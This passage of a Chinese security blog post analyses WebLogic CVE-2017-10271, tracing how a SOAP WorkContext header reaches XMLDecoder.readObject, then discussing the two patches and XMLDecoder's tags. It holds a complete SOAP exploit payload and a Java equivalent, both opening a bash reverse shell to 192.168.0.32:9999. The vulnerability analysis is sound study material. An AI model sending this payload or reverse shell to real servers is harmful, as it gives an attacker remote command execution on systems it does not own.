<p>上面流程太长了，下面直接把断点打在<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">            <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeaderOld(var3);</span><br><span class="line">                <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.processRequest(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-5.png"><br>var1为POST传进来的XML数据，var3是xml的头部解析，如果存在（头不为空），就进入readHeaderOld()方法，跟进readHeaderOld()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">        <span class="built_in">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一步processRequest中我们只把头读了进来，其他的数据还在缓冲区中，使用ByteArrayOutputStream函数读取剩余数据到var4。经过一系列的处理后，如果没有问题就创建WorkContextXmlInputAdapter对象 var6，之后跟进receive()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">WorkContextMapInterceptor</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进receiveRequest()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ((WorkContextMapInterceptor)<span class="built_in">this</span>.getMap()).receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将var1传到了receiveRequest()方法中，继续跟进</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WorkContextEntry</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextEntryImpl.readEntry(var1);</span><br><span class="line">            <span class="keyword">if</span> (var2 == WorkContextEntry.NULL_CONTEXT) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">            <span class="built_in">this</span>.map.put(var3, var2);</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest(&quot;</span> + var2.toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest : &quot;</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进 readEntry </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> WorkContextEntry <span class="title function_">readEntry</span><span class="params">(WorkContextInput var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var1</span> <span class="operator">=</span> var0.readUTF();</span><br><span class="line">    <span class="keyword">return</span> (WorkContextEntry)(var1.length() == <span class="number">0</span> ? NULL_CONTEXT : <span class="keyword">new</span> <span class="title class_">WorkContextEntryImpl</span>(var1, var0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里对var0执行了readUTF()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="keyword">return</span> (String)<span class="built_in">this</span>.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行了readObject()方法，对XMLDecoder对象进行了反序列化，导致远程命令执行。</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/102768">https://www.anquanke.com/post/id/102768</a></p>
<p>接下来我们详细剖析下payload的原理</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                /bin/bash</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                -c</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 SOAP 请求或者更具体地为什么在 WebLogic 中使用 SOAP，关联到了几个重要的点：Web服务的标准、WebLogic 服务器的功能以及企业级应用的需要。下面是这些关系的详细解释：</p>
<ol>
<li><strong>SOAP 和 Web 服务标准</strong><br>SOAP（Simple Object Access Protocol）是一种协议规范，用于在网络上交换结构化信息，它建立在 XML 协议之上，使其能够与任何系统的任何编程语言进行交互，这对于异构系统的集成非常重要。SOAP 定义了如何通过网络传输信息：</li>
</ol>
<ul>
<li><strong>独立于平台和语言</strong>：SOAP 提供了一种方式，允许不同操作系统和编程语言之间进行通信，这对于多种技术堆栈的企业环境至关重要。</li>
<li><strong>支持复杂的交互模式</strong>：与简单的 REST 相比，SOAP 支持更复杂的交互和更强的安全性，包括事务管理和双向操作。</li>
</ul>
<ol start="2">
<li><strong>WebLogic 服务器和 Web 服务</strong><br>WebLogic 是 Oracle 的一个企业级应用服务器，它提供了全面的支持用于开发、集成和部署企业级的 Java EE 应用。WebLogic 服务器提供的特性之一就是对 Web 服务的优秀支持，包括：</li>
</ol>
<ul>
<li><strong>SOAP 支持</strong>：WebLogic 提供对 SOAP Web 服务的原生支持。它能够承载使用 SOAP 协议的服务，处理 SOAP 消息，并进行必要的安全和事务处理。</li>
<li><strong>WS-Security</strong>：SOAP 的安全扩展（WS-Security）提供了一种机制来保证 SOAP 消息的安全，这是企业级应用所需的。WebLogic 支持这些标准，确保数据传输的安全性。</li>
</ul>
<ol start="3">
<li><strong>企业级应用的需要</strong><br>在企业级应用中，常常需要保证数据的安全传输和可靠性：</li>
</ol>
<ul>
<li><strong>可靠性和事务性</strong>：企业级应用通常要求数据传输必须是可靠的和具备事务性的，SOAP 提供了 WS-ReliableMessaging 和 WS-AtomicTransaction 等规范支持，这些都是 REST 很难完整提供的。</li>
<li><strong>服务描述</strong>：SOAP 使用 WSDL (Web Services Description Language) 描述服务接口，这对于企业级服务的自动发现和集成非常重要。</li>
</ul>
<ol start="4">
<li><strong>WebLogic 中的 SOAP 利用漏洞</strong><br>正因为 WebLogic 服务器广泛地支持使用 SOAP 进行复杂的 Web 服务交互，所以一旦这些处理机制中存在缺陷，它们就成为了攻击者的目标。例如，CVE-2017-10271 就是利用了 WebLogic 在解析 SOAP 请求时处理 XML 输入的方式中的漏洞。</li>
</ol>
<p>ProcessBuilder是什么? ，ProcessBuilder类是J2SE1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。说白了它能执行本地命令，但是它提供的功能更加丰富,能够设置工作目录、环境变量。<br>将上面的payload转化为java代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 ProcessBuilder 实例</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(commands);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 启动进程</span></span><br><span class="line">            processBuilder.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                <span class="keyword">if</span> (qName.equalsIgnoreCase(“object”)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> newIllegalStateException(“Invalid context type: object”);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这个是CVE-2017-3506的补丁，再对xml解析时，如果qName的值是Object时将抛出异常，采用的黑名单的方式。所以就出现了今天的分析的CVE-2017-10271。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        <span class="keyword">if</span> (qName.equalsIgnoreCase(“object”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: object”);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(“<span class="keyword">new</span>”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: <span class="keyword">new</span>”);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(“method”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: method”);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(“<span class="keyword">void</span>”)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!”index”.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> newIllegalStateException(“Invalid attribute</span><br><span class="line">                            <span class="keyword">for</span> element <span class="keyword">void</span>: ”+attributes.getQName(attClass));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是CVE-2017-10271补丁，分别对 Object new method void进行了判断,进行了防护。导致poc攻击失效。</p>
<h2 id="漏洞根源"><a href="#漏洞根源" class="headerlink" title="漏洞根源"></a>漏洞根源</h2><p>其实主要还是 XMLDecoder 的问题，<code>XMLDecoder</code> 是 Java Beans 中用于从 XML 文档中恢复 Java 对象图的一个工具。它是专为解码通过 <code>XMLEncoder</code> 编码的 XML 文档而设计的，但也可用于处理其他符合格式的 XML。<code>XMLDecoder</code> 主要处理以下几种类型的标签：</p>
<ol>
<li><code>&lt;object&gt;</code><br>这个标签用于创建一个对象的实例。它通常包含 <code>class</code> 属性来指定要实例化的类。这是最基本的用于实例化对象的标签。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;java&gt;</code><br>这个标签是用于封装整个 Java 对象序列化数据的根元素，提供了一个环境来指定 Java 版本和类定义。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;array&gt;</code><br>用于表示一个数组，通常包含 <code>class</code> 和 <code>length</code> 属性，用于指定数组的元素类型及长度。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;void&gt;</code><br>这是一个多功能的标签，用于表示不返回值的方法调用或属性设置。例如，它可用于调用方法或设置对象的属性。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>John Doe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>100<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;value&gt;</code><br>用于包装简单值或字符串，通常内嵌在其他标签中，用于设置属性或数组值。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;null&gt;</code><br>用于表示 null 值，常见于设置可为空的属性或对象引用。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;string&gt;</code><br>用于表示字符串值，经常用于属性赋值或方法参数。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;int&gt;</code>, <code>&lt;boolean&gt;</code>, <code>&lt;float&gt;</code>, <code>&lt;double&gt;</code> 等<br>用于表示基本数据类型的值。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">int</span>&gt;</span>42<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><code>&lt;list&gt;</code><br>用于创建 <code>List</code> 类型的集合。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><code>XMLDecoder</code> 的设计初衷是用于 JavaBeans 组件的配置和存储，因此它在解析时会创建并操作 Java 对象。由于其灵活性，<code>XMLDecoder</code> 可以被用来执行复杂的操作，包括调用任意方法，这可能导致安全问题。因此，使用 <code>XMLDecoder</code> 处理不受信任的 XML 数据时必须非常小心。</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
